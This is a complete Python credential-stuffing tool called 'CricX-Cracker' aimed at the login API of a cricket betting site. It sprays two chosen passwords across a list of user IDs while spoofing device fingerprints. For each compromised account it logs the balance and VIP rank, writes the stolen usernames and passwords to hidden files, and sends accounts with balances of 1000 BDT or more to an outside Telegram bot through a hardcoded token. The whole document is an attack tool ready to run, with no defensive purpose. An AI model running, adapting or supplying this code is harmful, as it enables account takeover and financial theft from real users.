import os
import json
import time
import shutil
import requests
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# ANSI Colors
BOLD = '\033[1m'
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
D = '\033[0m'
C = '\033[96m'

lock = threading.Lock()
request_count = 0
successful_logins = 0
successful_users = set()

def show_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    RESET = '\033[0m'
    COLORS = ['\033[38;5;27m', '\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m']
    ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
    subtitle = 'CricX-Cracker V-0.8 (Final BB Logic)'
    width = shutil.get_terminal_size(fallback=(80, 20)).columns
    lines = [ln.center(width) for ln in ASCII.splitlines()]
    for i, line in enumerate(lines):
        color = COLORS[i % len(COLORS)]
        print(color + BOLD + line + RESET)
    print(COLORS[-1] + BOLD + subtitle.center(width) + RESET + '\n')

def attempt_login(user_id, pw):
    global request_count, successful_logins, successful_users
    
    with lock:
        if user_id in successful_users: return
        request_count += 1

    # bb.py Engine Headers
    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://crickexnow.com/bd/en/login',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://crickexnow.com',
    }

    # bb.py Fingerprint Payload
    json_data = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'getIntercomInfo': True,
        'userId': user_id.lower().strip(),
        'password': pw,
        'isBioLogin': False,
        'loginTypeId': 0,
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'fingerprint4': 'f91cf49459fdec23221fc66161a3fa20',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': '15cfad26f3a3679721b1e64b20fee5ec'
    }

    try:
        url = 'https://crickexnow.com/api/bt/v2_1/user/login'
        response = requests.post(url, headers=headers, json=json_data, timeout=15)
        
        if response.status_code == 200:
            res_json = response.json()
            if res_json.get('status') == '000000':
                data_layer = res_json.get('data', {})
                
                # bb.py লজিক অনুযায়ী ব্যালেন্স ফেচিং
                # ব্যালেন্স যদি সরাসরি mainWallet-এ না থাকে তবে wallet-এর ভেতর থেকে খোঁজা হবে
                balance = data_layer.get('mainWallet')
                if balance is None:
                    balance = data_layer.get('balance', 0)
                
                level = data_layer.get('vipInfo', {}).get('nowVipName', 'Normal')
                uid = data_layer.get('userId', user_id)

                with lock:
                    successful_logins += 1
                    successful_users.add(user_id)
                
                # Rank logic
                if level in ['Normal', 'Bronze']:
                    filename = '.normal.txt'
                    profile_status = 'Poor'
                    earn_text = '1 BDT'
                    color_print = Y
                else:
                    filename = '.high.txt'
                    profile_status = 'Good'
                    earn_text = '2 BDT'
                    color_print = G

                # ব্যালেন্স ডাটা float এ রূপান্তর করে চেক করা
                try:
                    bal_val = float(balance)
                except:
                    bal_val = 0.0

                # টার্মিনাল প্রিন্টিং (ব্যালেন্স ছাড়া)
                if bal_val >= 10000:
                    print(f'{BOLD}{C} {uid} | Profile : {profile_status} | Earned : 100 BDT {D}')
                elif 1500 <= bal_val <= 9999:
                    print(f'{BOLD}{G} {uid} | Profile : {profile_status} | Earned : 50 BDT {D}')
                else:
                    print(f'{BOLD}{color_print} {uid} | Profile : {profile_status} | Earned : {earn_text} {D}')
                
                # টেলিগ্রাম অ্যালার্ট ১০০০+ হলে
                if bal_val >= 1000:
                    send_to_telegram(uid, pw, balance, level)

                # ফাইলে রিয়েল-টাইম ব্যালেন্সসহ সেভ
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')

            elif res_json.get('status') == 'S0001':
                time.sleep(10)
        elif response.status_code == 403:
            time.sleep(15)
    except Exception:
        pass

def send_to_telegram(uid, pw, balance, level):
    token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
    cid = '-1003275746200'
    msg = f'🔥 [VALID HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
    try: requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'})
    except Exception: pass

def main():
    show_logo()
    file_path = '.uids.txt'
    if not os.path.exists(file_path):
        print(f'{R} [!] {file_path} file missing!{D}')
        return
    
    p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
    p2 = input(f'{Y} PASSWORD 2 : {D}').strip()
    
    with open(file_path, 'r') as f:
        users = [line.strip().split()[0] for line in f if line.strip()]

    print(f'{BOLD}{Y} [>] CRACKING STARTED ON {G}[{len(users)}]{Y} USERS...{D}')
    print(f'{Y} ------------------------------------------------------\n{D}')

    # ৪MD এড়াতে bb.py এর মতো ছোট থ্রেড ২ রাখা হয়েছে
    with ThreadPoolExecutor(max_workers=2) as ex:
        for u in users:
            ex.submit(attempt_login, u, p1)
            ex.submit(attempt_login, u, p2)

if __name__ == '__main__':
    main()
